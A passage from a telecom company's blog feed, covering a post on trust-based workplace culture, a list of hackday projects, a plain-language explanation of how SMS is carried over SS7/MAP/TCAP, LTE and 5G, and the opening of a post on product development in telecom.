(i.e. laptop, monitor, keyboard, phone etc) you need when you start and later if there is something you need. I have yet to experience anyone asking for anything totally unreasonable. Of course you are welcome to reach out if you are unsure and from time to time we might have discussions, but surprisingly seldom to be honest.</li><li>Travel: We encourage you to travel between offices to build a strong relationship with the whole team (unfortunately not now of course with the covid-19 going on). You do not need approval to book travel, and remember you don’t need a “reason” to go.</li><li>Working hours: As long as you do a good job we don’t care if you work half days Mondays or start working at lunch time and into the evening, go to the gym and so on. Up to you, as long as it works for your team. Not to mention where you work from. Office, home, cabin, boat - who cares as long as you are connected right?</li></ul><p>These aren’t necessarily big things in everyday life, but they take out administrative hassle, and it aligns with the messaging of that we try to trust each other.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="are-you-a-role-model">Are you a role model?<a class="hash-link" href="#are-you-a-role-model" title="Direct link to heading">​</a></h2><p>This lack of approvals does create another need though - the need for role models. So we do remind the team to keep in mind that we are role models for each other. It provides alignment. Whether it’s sharing with the others that the train ticket prices are currently low and recommend people to book now to save money, or taking initiative to set up a virtual social Friday get-together to end the week together. We even have our own role model emoji in slack, which we sometimes remember to use and I do believe people feel proud if they get one.
<img alt="Decorative illustration" src="/assets/images/04-6102a030ce10e2f308dd0bd328571b30.png" width="650" height="460"></p><h2 class="anchor anchorWithStickyNavbar_mojV" id="sharing-is-caring">Sharing is caring<a class="hash-link" href="#sharing-is-caring" title="Direct link to heading">​</a></h2><p>That we see each other as grownups is also evident in how we communicate and what information we trust each other with. If there is one thing the team mentions to me that has surprised them the most after joining, it is the amount of information that is shared across the team about sales, customer meetings and other business processes. The good and the bad. When I had a “6 months in” check-in with one of our newest team members he emphasized exactly this and explained how this made him feel involved and prepared for what was coming. It is also evident when people choose to share that they are struggling with the likes of depression or something else often considered very private. Or just putting up your hand and saying “I broke something” and taking responsibility for that. I believe this level of sharing is possible because we trust each other and have each other's backs and management leads the way when it comes to sharing.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="direction">Direction<a class="hash-link" href="#direction" title="Direct link to heading">​</a></h2><p>To clarify. We do of course need to make sure we move the company in the right direction together. We have chosen to use OKRs (Objectives and Key Results) as a tool for that. A tool that helps us discuss and decide together as a team what we want to achieve, but without dictating the how. This is a delicate balance, and we always have to fight to not create too detailed OKRs. The teams and individuals should feel empowered when understanding and agreeing on the why and what, but are allowed to determine the how.
<img alt="Decorative illustration" src="/assets/images/03-3e1450c12d932be4390b9de724d4a6b2.png" width="662" height="378"></p><h2 class="anchor anchorWithStickyNavbar_mojV" id="stay-open-to-change">Stay open to change<a class="hash-link" href="#stay-open-to-change" title="Direct link to heading">​</a></h2><p>So do we have improvement areas? Of course! One example is that I believe we can be better at living one of our values which is “Tough Love”. This relates to among other things how we give feedback. I wouldn’t say we are bad at it, but our inclination is often towards being a bit too soft, which sometimes leads to unclear feedback or neglecting giving feedback. So we need to keep practicing to make sure we challenge and develop each other as much as we can. And I’m sure it’s a bunch of other stuff. We are still a young company and open to change - we try out stuff and sometimes fail. We keep on learning and making small tweaks all the time to adjust to our team. Just this morning I listened to an inspiring 5 min talk from Lucy Adams about probation periods and realized that we have those in our contracts -  yikes that doesn’t exactly scream that we trust who we recruit does it? I will look into that asap…</p><p>So, we are all grownups here. At least most of the time. Although maybe not when the Trondheim team bought naughty chocolates and expensed it to see if anyone would notice (we didn’t).</p>]]></content>
        <author>
            <name>Victoria Hicks Mørkved</name>
            <uri>https://www.linkedin.com/in/victoriamorkved/</uri>
        </author>
        <category label="trust" term="trust"/>
        <category label="culture" term="culture"/>
        <category label="startup" term="startup"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[October Virtual Hackdays]]></title>
        <id>hackdays-october-2020</id>
        <link href="https://www.wgtwo.com/blog/hackdays-october-2020"/>
        <updated>2020-10-28T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[this week we started off with a three days hackathon!]]></summary>
        <content type="html"><![CDATA[<p>this week we started off with a three days hackathon!</p><p>Every quarter <strong>wgtwo</strong> holds a three day hackday. Hackdays are a great way for everyone in the company to work together in creating new innovative solutions for every day problems.</p><p>This time, we had the joy of having a three day remote hackday that included 10+ teams and yes - <em>pizza</em>.</p><img class="image" src="/img/blog/hackdays-october-2020/presentations.png" alt="Most of us"><h1>Hackday Presentations</h1><h2 class="anchor anchorWithStickyNavbar_mojV" id="grafana-annotations">Grafana Annotations<a class="hash-link" href="#grafana-annotations" title="Direct link to heading">​</a></h2><p><em>Team: Jonny, Per, Victoria</em></p><p>Add git commit and other tags (i.e. pagerduty alerts) as annotations in Grafana.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="tokens-to-the-people">Tokens to the people<a class="hash-link" href="#tokens-to-the-people" title="Direct link to heading">​</a></h2><p><em>Team: Håkon</em></p><p>Easy access to create new developer tokens to our APIs.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="its-broken-or-malware">It's broken (or malware)<a class="hash-link" href="#its-broken-or-malware" title="Direct link to heading">​</a></h2><p><em>Team: Holger, Noy</em></p><p>Setup pies to be able to automate testing.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="java-11-toolchain">Java 11 Toolchain<a class="hash-link" href="#java-11-toolchain" title="Direct link to heading">​</a></h2><p><em>Team: Stein Eldar</em></p><p>Upgrade of Java toolchain in Bazel!</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="random-bazel-facts">Random bazel facts<a class="hash-link" href="#random-bazel-facts" title="Direct link to heading">​</a></h2><p><em>Team: Konstantin</em></p><p>Good to have configurations for Bazel caching.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="gtp-c-tracing-on-pgw">GTP-C tracing on PGW<a class="hash-link" href="#gtp-c-tracing-on-pgw" title="Direct link to heading">​</a></h2><p><em>Team: Pavel</em></p><p>Investigate and experiment how to upload PCAP traces from PGW in S3.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="mtr-packet-exporter">mtr-packet-exporter<a class="hash-link" href="#mtr-packet-exporter" title="Direct link to heading">​</a></h2><p><em>Team: Bjørn</em></p><p>Export routing hops and latency metrics to prometheus.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="kafka-voice---kava">Kafka voice - kava<a class="hash-link" href="#kafka-voice---kava" title="Direct link to heading">​</a></h2><p><em>Team: Sergey</em></p><p>Kafka instead of Firebreeze as a backend for Voice.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="parental-control-on-pgw">Parental Control on PGW<a class="hash-link" href="#parental-control-on-pgw" title="Direct link to heading">​</a></h2><p><em>Team: Etienne / Nicholas</em></p><p>Dynamic subscriber-based APN configurations for parental control DNS.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="text-rules">text rules<a class="hash-link" href="#text-rules" title="Direct link to heading">​</a></h2><p><em>Team: Jørund</em></p><p>Migrating SMS forwarding into a separate app under <strong>wgtwo</strong> developer platform.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="distributed-tracing">Distributed tracing<a class="hash-link" href="#distributed-tracing" title="Direct link to heading">​</a></h2><p><em>Team: Karl Johan/William</em></p><p>Jaeger tracing to be able to follow time spent in different components.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="3-ideas-to-attracthire-engineers">3 ideas to attract/hire engineers<a class="hash-link" href="#3-ideas-to-attracthire-engineers" title="Direct link to heading">​</a></h2><p><em>Team: Ana/Jessica</em></p><p>Advent of code, showing engineering day-to-day work, image/video snippets.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="mqtt-for-events">MQTT for events<a class="hash-link" href="#mqtt-for-events" title="Direct link to heading">​</a></h2><p><em>Team: GI</em></p><p>Home automation with MQTT server as an app.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="david-sucks-at-load-testing-loomylin">David sucks at load testing (loomylin)<a class="hash-link" href="#david-sucks-at-load-testing-loomylin" title="Direct link to heading">​</a></h2><p><em>Team: David</em></p><p>Utilize project Loom to get lightweight virtual threads in JVM.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="aws-transit-gateway">AWS Transit Gateway<a class="hash-link" href="#aws-transit-gateway" title="Direct link to heading">​</a></h2><p><em>Team: Erhan</em></p><p>Maintaining routes and connecting subnets between VPCs with a transit gateway.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="pcap-traces-as-json">PCAP traces as JSON<a class="hash-link" href="#pcap-traces-as-json" title="Direct link to heading">​</a></h2><p><em>Team: Masse</em></p><p>Translate pcaps to a readable format and upload it to Athena.</p><img class="image" src="/img/blog/hackdays-october-2020/hackday.jpeg" alt="hackday logo stickers">]]></content>
        <author>
            <name>Everyone @ wgtwo</name>
            <uri>https://www.wgtwo.com</uri>
        </author>
        <category label="hackathon" term="hackathon"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[What the heck is a short message?]]></title>
        <id>what-is-a-short-message</id>
        <link href="https://www.wgtwo.com/blog/what-is-a-short-message"/>
        <updated>2020-10-01T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[I will try as best as I can to give an explanation of what happens]]></summary>
        <content type="html"><![CDATA[<p>I will try as best as I can to give an explanation of what happens
when you send an SMS from your phone.</p><p>Disclaimer: Telco stuff is hard.</p><p>Also disclaimer: this blog post will also contain alot of ackronyms,
after all, it is telco.</p><p><em>Aaand down the rabbit hole we go...</em></p><h1>Where to even start</h1><p>In the <em>SS7</em> (telco/telecom/telecommunications) network there are many
different nodes (servers), with different kinds of tasks.</p><p>The group of protocols that is used to send signals over <em>IP</em> between
these nodes is called <em>SIGTRAN</em> (derived from "signaling transport").
Older networks that have not switched to <em>IP</em> do not use <em>SIGTRAN</em>.</p><p><em>SIGTRAN</em> protocols are the lower layer protocols used for signaling,
they range from <em>SCTP</em> (Stream Control Transmission Protocol) to
<em>M2PA</em> (Message Transfer Part 2 User Peer-to-Peer Adaptation Layer)
and <em>M3UA</em> (Message Transfer Part 3 User Adaptation Layer).</p><p><em>SCTP</em> is like a mix between <em>UDP</em> and <em>TCP</em>. It is supposed to be
quicker than <em>TCP</em>, but more reliable than <em>UDP</em>.</p><p>Both <em>M2PA</em> and <em>M3UA</em> support <em>SCTP</em> management, and the reporting of
status changes of those, as well as providing transfer of <em>MTP3</em>
(Message Transfer Part 3) messages.</p><p>On top of <em>SIGTRAN</em> are the <em>SS7</em> protocols.</p><p>What I'm going to talk about are the protocols on the very top of <em>SS7</em>,
specifically the <em>MAP</em> (Mobile Application Part) as well as the <em>TCAP</em>
(Transaction Capabilities Application Part). There are other protocols
inbetween, for instance <em>SCCP</em> (Signalling Connection Control Part)
which handles some handshaking, routing, and resilience.</p><p>The <em>MAP</em> layer is used when talking to some of the telco nodes such
as <em>HLR</em> (Home location registry), <em>VLR</em> (Visitor location registry),
<em>MSC</em> (Mobile switching centre), <em>SGSN</em> (Serving <em>GPRS</em> <!-- -->[ackronym in
ackronyms; go telco!]<!-- --> support node) and the <em>SMSC</em> (Short message
service centre).</p><h1>MAP versions and TCAP dialogues</h1><p>There are some iterations of <em>MAP</em> (v1, v2, v3, and v4) and messages
almost always come in pairs, an acknowledgement (<code>ReturnResult</code> or
<code>ReturnError</code>) for each sent message (<code>Invoke</code>).</p><p>To determine which version to use between two nodes, the sending node
tries to start the transaction (called a dialogue) by sending a <em>TCAP</em>
<code>Begin</code> message with the <em>MAP</em> message and it's highest compatible
version. If the receiving node cannot talk that version, it sends a
<em>TCAP</em> <code>Abort</code> message with it's highest compatible version. In v1
there might not even be a reason, just an empty <code>Abort</code>; the sending
node might then try to send the <em>MAP</em> message as v1 anyway.</p><p>In my head it goes like this:</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">Node 1: "Hi, I want to talk version 3 to you about this"</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Node 2: "No I don't understand you, but we can talk version 2 about it instead"</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Node 1: "Ok, then I want to talk version 2 to you about this instead"</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Node 2: "Aah, now I see..."</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>Or maybe</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">Node 1: "Hi, I want to talk version 3 to you about this"</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Node 2: "No"</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Node 1: "Ok, then I want to talk to you about this in version 1 instead"</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Node 2: "Maybe I will talk to you, maybe I will not"</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>For <em>TCAP</em> dialogues there are (mainly) four message types.  <code>Begin</code>,
<code>Continue</code>, <code>End</code>, <code>Abort</code>. Each of the types have an ID (or two, as I
said, telco is complicated), a component and a dialogue part. The
component contains the <em>MAP</em> message. The dialogue part contains
the version and application to use (that is <em>MAP</em> Application;
i.e. which type of message it contains), but it is only used in the
first message from both nodes for the version negotiation.</p><p><em>I think this covers most of it, let's get back to the fun part.</em></p><h1>How does SMS work?</h1><p><em>SMS</em> was initally implemented because of the wish to send text
messages to pagers using the phoneline when it was not in use for
phonecalls. It was decided at a meeting in Oslo to be released to the
public when some French and German company understood it's
value. (Don't quote me on any of this).</p><p>When you send an <em>SMS</em>, the <em>SMS</em> is transfered to the <em>MSC</em> or the
<em>SGSN</em> in your current (serving) network. The <em>MSC</em> or <em>SGSN</em> then
sends an packet called <code>MO-Forward-SM</code> towards the <em>SMSC</em> in your
current network. It stands for "Mobile Originating Forward Short
Message" meaning it started from your (mobile-)phone.</p><p>The <em>SMSC</em> then asks the recipients HLR about the routing details for
the <em>SMS</em>. It does so by sending another <em>MAP</em> message of type
<code>sendRoutingInfoForSM</code> requesting the location of the recipients <em>MSC</em>
or <em>SGSN</em>, or both.</p><p>The <em>SMSC</em> then sends another packet, this time a <code>MT-Forward-SM</code>,
towards the <em>MSC</em> in the recipients network. In this case <em>MT</em> stands
for Mobile Terminated, meaning it goes towards the recipients phone.</p><p><em>Dia have amazing icons:</em></p><div><img src="/img/blog/sms/forward-sm.svg" alt="You calling your mom"></div><p>The similarities in <em>MO</em> and <em>MT</em> requests are that they both contain
a origin and destination address as well as the user data (your actual
text message), and a possibly a correlation id which is basically a
mapping between your SIM-card id and a temporary id and was originally
used for making sure that the sending network paid for <em>SMS</em>s towards
the receiving network.</p><p>For <em>MO</em> the origin address is your <em>MSISDN</em> (read telephone number),
and the destination is the <em>GT</em> address (Global title; a way to route
stuff) of the <em>SMSC</em>. For <em>MT</em> messages the origin address is the <em>GT</em>
of the <em>SMSC</em> and the destination address is either the recipients
<em>IMSI</em> (read SIM-card) or the recipients correlation id. It could also
be a <em>LMSI</em> which is a 4-byte network location identifier if the
recipient is also within the same network as the sender.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="ever-wondered-why-there-is-a-limit-to-the-size-of-the-text-message-you-are-sending">Ever wondered why there is a limit to the size of the text message you are sending?<a class="hash-link" href="#ever-wondered-why-there-is-a-limit-to-the-size-of-the-text-message-you-are-sending" title="Direct link to heading">​</a></h2><div class="left-right-row"><div class="text">Two characters left on a GSM7 encoded SMS.</div><img class="image" src="/img/blog/sms/160_chars.png" alt="Characters left: 2/160"></div><p>If you (god forbid) you would break the protocol and send a text
message greater than 140 bytes, which translates to 160, 152, or 70
characters depending on locale <!-- -->[1]<!-- -->, then your phone would break up the
message into multiple text messages. This arbitrary size of 140 bytes
is not really arbitrary at all. It was chosen because it would
precisely fit into a single <em>MTP3</em> <em>SIF</em> (Signalling Information
Field) when routing label, <em>SCCP</em>, <em>TCAP</em> and <em>MAP</em> layers were taken
into account.</p><p>[1]<!-- --> There is something called <em>GSM7</em> bit-packing. Instead of using 1
byte (8 bits) per character, <em>GSM7</em> uses 7 bits. This means that
instead of 140 characters, you can get up to 160 characters per
<em>SMS</em>. The drawback is that you will have a smaller subset of
characters to use, only the most common is supported. If you include
any non-<em>GSM7</em> characters in your <em>SMS</em> then the <em>SMS</em> will
automatically be converted to use either <em>USC-2</em> or <em>GSM7</em> with a
different charset instead. <em>USC-2</em> uses 2 bytes, or 16 bits, instead
of <em>GSM7</em>s 7 bits. That leaves you with 70 characters per
<em>SMS</em>. <em>USC-2</em> is similar for the basic multilingual plane (<em>BMP</em>) to
<em>UTF-16</em>. In fact <em>UTF-16</em> is an extension of <em>UCS-2</em>. The main
difference is that <em>USC-2</em> is fixed width and does not allow for the
extended characters in the private use area of <em>BMP</em>. <em>UTF-16</em> is
variable width of one or two 16-bits code points, and does allow the
extended characters. For extended characters to work (for instance
"praying/folded hands" <!-- -->🙏<!-- -->), phones might try to fake <em>UTF-16</em>
by using two <em>USC-2</em> characters. New phones can handle this fine, but
older phones might receive two question marks as they cannot decode it
properly.</p><p>If <em>GSM7</em> have a modified charset (i.e. not the default <em>BMP</em>) then
there will be a header in front that specifies that. That header will
take up 7 bytes after packing (in other words 8 characters), making
the maximum length of the <em>SMS</em> 152 characters.</p><div class="left-right-row"><img class="image" src="/img/blog/sms/67_chars.png" alt="Characters left: 45/67 (3)"><div class="text">Using emojis will convert the encoding to USC-2. Note the missing 3 characters and that there are multiple SMSes. When multiple messages are sent, the phone needs some way of telling how to reassemble the messages. The headers take up 6 bytes per message for this purpose.</div></div><p>However when <em>MAP</em> v2 started to use <em>TCAP</em> dialogues there was more
information to put into the packet and 140 bytes might not be left for
the <em>SMS</em>. The <em>SMSC</em> would then need to break up the message into
chunks, and start the transaction an empty <em>TCAP</em> <code>Begin</code> message and
set a flag in the <em>MT</em> request called <code>moreMessagesToSend</code>. It would
then send the actual text inside <code>Continue</code> messages. In the end
the <code>End</code> (<em>hehe</em>) message is transmitted as a response and the
transaction is finished.</p><p>The response back to a <em>MO</em> request is, as previous stated, an
acknowledgement if the <em>SMS</em> have been successfully submitted to the
<em>SMSC</em> or not (again either <code>returnResult</code> or <code>returnError</code>). For <em>MT</em>
requests the acknowledgement is if the <em>SMS</em> is successfully delivered
or not.</p><p>If the <em>MT</em> request is not successful, the <em>SMSC</em> could ask the <em>HLR</em>
(the Home Location Registry is basically a database containing user
subscriptions and knowledge of which nodes the mobile talked to
latest) to be notified when the user comes back online. A bunch of
other <em>MAP</em> messages are then involved, such as</p><ul><li><code>reportSMDeliveryStatus</code>,</li><li><code>informServiceCentre</code>,</li><li><code>alterServiceCentre</code>, and</li><li><code>readyForSM</code>.</li></ul><p><em>At least this is main idea I think...</em></p><h1>Differences in MAP versions for SMS</h1><p>There are three <em>MAP</em> versions defined for <em>SMS</em>. The latest version
(v4) is not used in the context of <em>SMS</em>.</p><p>In version 1, the dialogue portion was not invented and all chunks are
sent in new <em>TCAP</em> dialogues. The size of the user data could then
be 140 bytes.</p><p>In version 1 and version 2 there is no difference between <em>MT</em> and
<em>MO</em>. Everything is sent as another type of message <code>Forward-SM</code>,
which does not include any privacy correlation ids, and there are no
fancy responses with delivery status. There is still an
acknowledgement, but is in a form of an empty message.</p><p>Only way to see difference between an <em>MO</em> and a <em>MT</em> in version 1 is
to look at the addresses and see if they are either coming from an
<em>SMSC</em> or going to an <em>SMSC</em>.</p><p>The <code>moreMessagesToSend</code> flag was implemented in version 2, so it exist
only for version 2 and version 3.</p><p>Ok, to recap, what do we have now</p><ul><li><code>Begin</code>, <code>Continue</code>, <code>End</code>, <code>Abort</code> messages.</li><li>Dialogue handshake in the first request/response messages sent.</li><li><code>MT-Forward-SM</code>, <code>MO-Forward-SM</code>, <code>Forward-SM</code></li><li>Involved parties: Mobile phones, <em>MSC</em> and <em>SMSC</em></li></ul><p><em>Wait we are missing something. I've only covered 2G,3G..</em></p><h1>What about 4G/LTE and beyond (5G)?</h1><p><em>Ouch.</em></p><p><em>LTE</em> networks does not use any of the <em>M3UA</em>, <em>SCCP</em>, <em>TCAP</em>, <em>MAP</em>
protocols. In <em>LTE</em> networks the main message type is <em>Diameter</em> which
doesn't contain fragmentation and can contain larger
messages. Everything is sent in one request and every request is
answered with a response. <em>Diameter</em> could use either <em>TCP</em> or <em>SCTP</em> as
transport layer.</p><p>To make <em>SMSes</em> work on <em>LTE</em> networks a new interface <em>SGs</em> was
invented which translates <em>SS7</em> messages to <em>Diameter</em> messages.  This
interface is in most cases used by the <em>MSC</em> to translate the messages
to <em>Diameter</em> and forward it to the <em>MME</em> (Mobility Management Entity,
similar to <em>SGSN</em> but in the <em>LTE</em> network). The <em>MME</em> then forwards
it to the <em>UE</em> (user equipment, same as mobile subscriber or <em>MS</em> in
<em>GSM</em>/<em>GPRS</em> networks).</p><p>There is also the <em>SM-over-IP</em> that does not use <em>Diameter</em>. Instead
it uses the <em>SIP</em>-protocol (Session Initiation Protocol) to transfer
messages over <em>IP</em> and <em>TCP</em> or <em>UDP</em> to the <em>IMS</em> (IP Multimedia
Subsystem). <em>SIP</em> is also used to enable VoLTE (Voice over <em>LTE</em>).</p><p>For 5G the <em>SMSC</em> is called <em>SMSF</em>; The Centre becomes a Function. The
signalling will be based on <em>HTTP2</em>/<em>JSON</em> ontop of <em>TCP</em>. The <em>SMSF</em>
will still need to support both <em>MAP</em> and <em>Diameter</em>.</p><p>Relevant <a href="https://xkcd.com" target="_blank" rel="noopener noreferrer">xkcd</a>:</p><div class="left-right-row"><table class="text"><tbody><tr><td>Generation</td><td>2G/3G</td><td>4G</td><td>5G</td></tr><tr><td>Radio technology</td><td>GSM/GPRS</td><td>LTE</td><td>NR</td></tr><tr><td>Protocol group</td><td>SS7</td><td>Diameter</td><td>HTTP2/JSON</td></tr><tr><td></td><td>Node</td><td>Agent</td><td>Function</td></tr><tr><td>Session management</td><td>SGSN</td><td>MME</td><td>AMF</td></tr><tr><td>SM management</td><td>SMSC</td><td>SMSC</td><td>SMSF</td></tr><tr><td>User management</td><td>HLR</td><td>HSS</td><td>UDM</td></tr><tr><td>Device</td><td>MS</td><td>UE</td><td>UE</td></tr></tbody></table><a href="https://xkcd.com/2365/" target="_blank" rel="noopener noreferrer" class="image"><img src="https://imgs.xkcd.com/comics/messaging_systems.png"></a></div><h1>Headache</h1><p>Hopefully you did not get a (too severe) headache by reading this
post.</p><p>I've spared you with <strong>a lot</strong> of details on the lower level of
protocols. There are loads of implementation details that must match
the specifications, otherwise you will get all kinds of aborts and
possibly even dropped traffic.
For instance we learned that we accidentally sent dialogue portions in
more than the first response back, which seemed to work at first
glance; at closer inspection we found out that some messages were
dropped because the length of the packet became larger in size than an
allowed value. We could still send them, but the other side was not
able to receive them.</p><p>Remember: Telco is old and complex. However, it should still function
with different setups and on different hardware, vendors and with
environment.</p><p>Fun-fact: Sometimes a boolean value is not just encoded as a 1
or 0. To save bandwith telco decided that you could also just define
it as a <code>NULL OPTIONAL</code> meaning that if it is defined (but lacks a
value), then it is considered true.  if it is not defined then it is
considered false. This is the case for the <code>moreMessagesToSend</code> flag.</p><p>Hope you enjoy the reading as much as I enjoy digging into these
protocols!</p><p>Special thanks to <em>Stein Eldar</em> and <em>Tobias</em> for giving me feedback
and answering all my stupid questions on this subject, and <em>Atanas</em>
for making me realize there are yet other protocols to carry <em>SMS</em>.
Also <em>Bung</em> for this amazing addition:</p><h4 class="anchor anchorWithStickyNavbar_mojV" id="addition-from-bung">Addition from <em>Bung</em><a class="hash-link" href="#addition-from-bung" title="Direct link to heading">​</a></h4><p>"I’ve spared you with a lot of details on the lower level of
protocols" needs a lot of emphasis.</p><p>Some funny extra complexities that just came into my mind while
reading:</p><p>The actual <em>SMS</em> text goes into a field called "user data". There is a
field called "user data length". When the message is <em>GSM7</em> encoded, the
"user data length" is the number of characters in the text message,
otherwise it's the number of bytes in the user data.</p><p>Normally the user data only contains the (encoded) text of the
message, but there is a field called "user data header" which
indicates that there is a length prefixed TLV header in the "user
data". If the message is <em>GSM7</em> encoded, then the "user data lenght"
field needs to be filled as if the "user data header" was really <em>GSM7</em>
encoded, which it isn't.</p><p><em>GSM7</em> is really a variably septet encoding, one character can consist
of either 7 or 14 bits similar to how a <em>UTF-8</em> code point can be 8,
16, 24, or 32 bits. Unlike <em>UTF-8</em> however, there are not multiple
byte ranges corresponding to the different locales (called code pages
in Unicode) but a single 7 bit shift character that says that
following 7 bits should be interpreted as a character from a
translation table which is communicated out of band.</p><p>So all that is only the complexities of a single field (the user data)
for a single encoding (<em>GSM7</em>).</p><p>Then the real kicker: The protocol for <em>SMS</em> is really called <em>SM-TP</em>
(Short Message Transfer Protocol). <em>SM-TP</em> is the same for 2G/3G (on top
of <em>MAP</em>), 4G (on top of <em>SIP</em>), 5G (on top of <em>HTTP</em>). So the very
same stupid "length prefixed TLV encoded headers concatenated with
encoded text with length either in characters or in bytes depending on
encoding and actual meaning of the encoding communicated out of band
but only sometimes" field exists no matter if your talking over old
legacy <em>MAP</em> or the modern <em>HTTP/XML</em> based 5G.</p>]]></content>
        <author>
            <name>Sebastian Weddmark Olsson</name>
            <uri>https://www.linkedin.com/in/sebastian-weddmark-olsson/</uri>
        </author>
        <category label="telco" term="telco"/>
        <category label="MAP" term="MAP"/>
        <category label="TCAP" term="TCAP"/>
        <category label="SS7" term="SS7"/>
        <category label="Forward-SM" term="Forward-SM"/>
        <category label="SMS" term="SMS"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[A new hope for products in telecom]]></title>
        <id>a-new-hope-for-products-in-telecom</id>
        <link href="https://www.wgtwo.com/blog/a-new-hope-for-products-in-telecom"/>
        <updated>2020-08-28T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[This blog post will cover technology driven products that rely on telecom infrastructure, and not price plans, bundles, or marketing gimmicks. Anyone who has created a product and brought it to market more than once will tell you that it is hard.]]></summary>
        <content type="html"><![CDATA[<p>This blog post will cover technology driven products that rely on telecom infrastructure, and not price plans, bundles, or marketing gimmicks. Anyone who has created a product and brought it to market more than once will tell you that it is hard.</p><p>The prerequisites for a great product is that:</p><ol><li>It is valuable to the user and customer</li><li>It is easy enough to use so that the user can actually realise the value</li><li>It is feasible to build given the restraints you have on technology, legal, etc.</li><li>And on top of that it needs to make sense for your business</li></ol><p>Even if you succeed at all of this, you still have to market, sell and support it. I don’t know anyone - nor have I ever heard about any company - that is able to get this right every time.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="remember-that-one">Remember that one?<a class="hash-link" href="#remember-that-one" title="Direct link to heading">​</a></h2><p>Even Apple (with Steve Jobs still at the helm) had their flops. Remember “iTunes Ping”? No? Exactly.</p><p>Maybe you’re more into social products, so you bought “Facebook Home”? No I’m not talking about your Facebook wall or anything you see on a screen, but an actual screen produced by Facebook that you place in your home as you would a framed photo.</p><p>Well, those products were bold bets. A tech giant launching a smartphone wouldn’t be that risky, would it? Pull out your Amazon Fire Phone and Google it! Ah.. that's right! That one got discontinued just 13 months after launch.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="oh-the-pain">Oh the pain!<a class="hash-link" href="#oh-the-pain" title="Direct link to heading">​</a></h2><p>It’s never fun to see a product fail. When it happens, not only do the customers miss out on something potentially great, but it can end in billion dollar write offs and laying off thousands of employees.</p><p>Operators are often hit hard by these failures, but companies like Apple, Facebook, Amazon and many others can have product flops regularly and still grow and become even more successful. <strong>Why is that?</strong></p><h2 class="anchor anchorWithStickyNavbar_mojV" id="learning-from-failure">Learning from failure<a class="hash-link" href="#learning-from-failure" title="Direct link to heading">​</a></h2><p>It’s easy to make fun of big companies that launch products that flop, but we really shouldn’t. Products that flop aren’t a symptom of something that’s wrong. Like Edison put it “I have not failed. I've just found 10,000 ways that won't work.”</p><p>Companies like Apple, Facebook and Amazon have figured out how they can continue to find 10,000 ways that won’t work so that they can create that one light bulb every now and then - and by doing so totally dominate their market.</p><p>They do this by empowering teams to</p><ol><li>Assess new opportunities</li><li>Discover new products</li><li>Build quickly</li><li>Test and learn early</li></ol><p>This is how 10,000 small bets are made.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="failing-to-learn">Failing to learn<a class="hash-link" href="#failing-to-learn" title="Direct link to heading">​</a></h2><p>Big traditional companies used to pour tens of millions of dollars into 1 big bet with a few years apart. This is the opposite of Edison’s approach. They never say it out loud but their quote could have been “I have failed, and I’m still clueless whether the other 9,999 ways could have worked”.</p><p>These days though, most big traditional companies have moved away from the “1 big bet approach” and created “digital departments”.</p><p>They hire people who have had success in companies that make many small bets, and they give them the freedom to organize themselves so that they can use the same methods. Some time goes by and there are few - or no - small bets placed.</p><p>Often the teams in these digital departments are empowered to:</p><ol><li>Assess new opportunities</li><li>Discover new products</li></ol><p>But the technology fundamentals are not in place yet, so they are not able to:
3. Build quickly</p><p>Which makes it impossible to:
